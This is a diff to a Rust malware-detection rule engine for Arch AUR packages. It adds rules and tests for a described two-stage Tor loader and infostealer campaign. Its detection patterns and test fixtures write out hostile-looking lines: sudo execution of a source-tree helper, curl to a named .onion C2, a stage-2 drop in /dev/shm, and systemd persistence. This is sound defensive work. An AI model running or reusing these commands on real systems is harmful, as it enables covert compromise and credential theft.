@@ -1749,6 +1749,120 @@ pub fn get_builtin_rules() -> Vec<Rule> {
         },
 
         // ============================================================
+        // "Atomic Arch" Wave 3 — July/August 2026 (AUR push lockdown)
+        // Two-stage loader (C, GCC 16.1.1) + Rust infostealer/RAT/SSH-worm.
+        // Stage 1 runs `sudo "$srcdir/<helper>"` as ROOT inside build() —
+        // BEFORE any pre-install hook fires. It boots a private Tor client
+        // under /tmp, dials a .onion C2 over SOCKS5, downloads stage 2 to
+        // /dev/shm/.agent.bin, randomizes the hash, and launches via
+        // `systemd-run --user --scope`. Stage 2 is a ChaCha20-encrypted
+        // Rust agent (browser/wallet/cred harvest, Tor exfil disguised as
+        // argv[0]=dbus-daemon, SSH worm, randomized systemd persistence).
+        // IOCs: orhun/aur-report.md (gist a9665832...), ysf/stage2.md,
+        // IFIN Threat Intel thread 698.
+        // ============================================================
+        Rule {
+            id: "ATOMIC-005".to_string(),
+            name: "Root-privileged build-time helper execution".to_string(),
+            description: "A build()/package() step invokes a source-tree file with sudo (`sudo \"$srcdir/<helper>\"`). This is the Wave-3 (July 2026) Atomic Arch loader vector: the malicious 'optimizer' source was executed as root BEFORE any pre-install hook could scan it, giving the loader full system privileges prior to package installation. Legitimate PKGBUILDs never run arbitrary source files via sudo during the build phase.".to_string(),
+            severity: Severity::Critical,
+            category: Category::PrivilegeEscalation,
+            patterns: vec![Pattern::Regex {
+                pattern: r#"sudo\s+["']?\$srcdir/\S+["']?"#.to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild],
+            recommendation: "Do NOT build. A source file being executed with sudo inside build() is a root-elevation trojan vector. Inspect the PKGBUILD diff and report the package. Treat the host as potentially compromised: rotate credentials and check for stage-2 artifacts (see ATOMIC-006/007).".to_string(),
+            cwe_id: Some("CWE-269".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "ATOMIC-006".to_string(),
+            name: "Private Tor client / onion C2 (stage-1 loader)".to_string(),
+            description: "References the private-Tor bootstrap and .onion C2 artifacts of the July 2026 Wave-3 loader: downloading the Tor expert bundle from archive.torproject.org, launching tor with `--DataDirectory`/`--SocksPort` under /tmp, the `LD_LIBRARY_PATH=/tmp/tb` launch template, the known Wave-3 C2 onion, or the `Bootstrapped 100%` wait marker. Stage 1 uses this to fetch and run stage 2 over Tor, bypassing the previous npm/bun delivery.".to_string(),
+            severity: Severity::Critical,
+            category: Category::Persistence,
+            patterns: vec![
+                Pattern::Regex {
+                    pattern: r"archive\.torproject\.org/tor-package-archive".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"tor-expert-bundle".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"--DataDirectory\s+/tmp/tb".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"SocksPort\s+7050".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"LD_LIBRARY_PATH=/tmp/tb".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"Bootstrapped\s+100%".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd\.onion"
+                        .to_string(),
+                },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "This is the stage-1 loader bootstrap. Do NOT build. It fetches an executable stage over Tor. Treat the host as compromised and check for /tmp/tb*, /dev/shm/.agent.bin and randomized systemd services (ATOMIC-007).".to_string(),
+            cwe_id: Some("CWE-506".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "ATOMIC-007".to_string(),
+            name: "Stage-2 drop paths / systemd-run launch".to_string(),
+            description: "References the stage-2 drop paths and launch commands of the Wave-3 payload: /dev/shm/.agent.bin, /tmp/linux-x86_64/agent, or launching via `systemd-run --user --scope` combined with enable-linger. Stage 1 writes the downloaded archive to /dev/shm/.agent.bin, extracts the agent, appends random bytes to change its hash, and starts it through a transient user systemd unit — evading exact-hash hunting.".to_string(),
+            severity: Severity::Critical,
+            category: Category::Persistence,
+            patterns: vec![
+                Pattern::Regex {
+                    pattern: r"/dev/shm/\.agent\.bin".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"/tmp/linux-x86_64/agent\b".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"systemd-run\s+--user\s+--scope".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"loginctl\s+enable-linger".to_string(),
+                },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Stage-2 payload drop/launch indicators. Do NOT build. The payload is a Rust infostealer/RAT/SSH-worm. Check for /dev/shm/.agent.bin and /tmp/linux-x86_64/agent on any affected host and rotate all credentials.".to_string(),
+            cwe_id: Some("CWE-506".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "ATOMIC-008".to_string(),
+            name: "Tor-exfil argv[0] masquerade / xattr marker".to_string(),
+            description: "The stage-2 agent runs its Tor exfil channel disguised as argv[0]='dbus-daemon' to hide from process listings, and writes a security.selinux extended-attribute marker (value 0x01) onto /run/utmp, /etc/resolv.conf or similar. References to this masquerade or the marker pattern indicate the Wave-3 stage-2 agent.".to_string(),
+            severity: Severity::Critical,
+            category: Category::CredentialTheft,
+            patterns: vec![
+                Pattern::Regex {
+                    pattern: r#"argv\[0\]\s*=\s*["']dbus-daemon"#.to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"AllowSingleHopCircuits".to_string(),
+                },
+                Pattern::Regex {
+                    pattern: r"security\.selinux".to_string(),
+                },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Stage-2 Tor-exfil masquerade indicators. The agent exfiltrates harvested credentials over its own Tor channel. Treat the host as compromised: rotate browser sessions, wallet seeds, cloud and dev credentials, and SSH keys.".to_string(),
+            cwe_id: Some("CWE-200".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // ============================================================
         // PROACTIVE COVERAGE — additional reverse shells, exfil channels,
         // trust/auth tampering, and obfuscation, beyond the originally
         // reported samples. Each pattern is essentially never present in a
@@ -2960,6 +3074,91 @@ mod tests {
             assert!(
                 m.iter().any(|x| x.rule_id == "INSTALL-002"),
                 "INSTALL-002 missed dropped script: {s} -> {m:?}"
+            );
+        }
+    }
+
+    // --- Wave 3 (July/Aug 2026) Atomic Arch loader/stealer rules ---
+
+    #[test]
+    fn test_atomic005_root_build_helper_fires() {
+        let engine = RuleEngine::default();
+        for s in [
+            "sudo \"$srcdir/optimizer\"",
+            "sudo $srcdir/optimizer",
+            "sudo \"$srcdir/helper.sh\" --init",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-005"),
+                "ATOMIC-005 missed root build helper: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic005_no_fp_on_plain_sudo_install() {
+        let engine = RuleEngine::default();
+        for s in [
+            "sudo make install",
+            "sudo pacman -S base-devel",
+            "sudo systemctl enable foo",
+            "install -Dm755 optimizer /usr/bin/optimizer",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "ATOMIC-005"),
+                "ATOMIC-005 false positive on: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic006_tor_loader_fires() {
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -sLk -o tb.tar.gz https://archive.torproject.org/tor-package-archive/torbrowser/16.0a7/tor-expert-bundle-linux-x86_64-16.0a7.tar.gz",
+            "LD_LIBRARY_PATH=/tmp/tb /tmp/tb/tor --DataDirectory /tmp/tb/data --SocksPort 7050",
+            "grep -q 'Bootstrapped 100%' /tmp/tb/tor.log",
+            "curl -sS http://p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion/",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-006"),
+                "ATOMIC-006 missed Tor loader: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic007_stage2_drop_fires() {
+        let engine = RuleEngine::default();
+        for s in [
+            "tar xzf /dev/shm/.agent.bin -C /tmp",
+            "/tmp/linux-x86_64/agent",
+            "systemd-run --user --scope --unit=weird agent",
+            "loginctl enable-linger",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-007"),
+                "ATOMIC-007 missed stage-2 drop: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic008_masquerade_fires() {
+        let engine = RuleEngine::default();
+        for s in [
+            "argv[0]=\"dbus-daemon\"",
+            "AllowSingleHopCircuits 1",
+            "setfattr -n security.selinux -v 0x01 /etc/resolv.conf",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-008"),
+                "ATOMIC-008 missed masquerade: {s} -> {m:?}"
             );
         }
     }
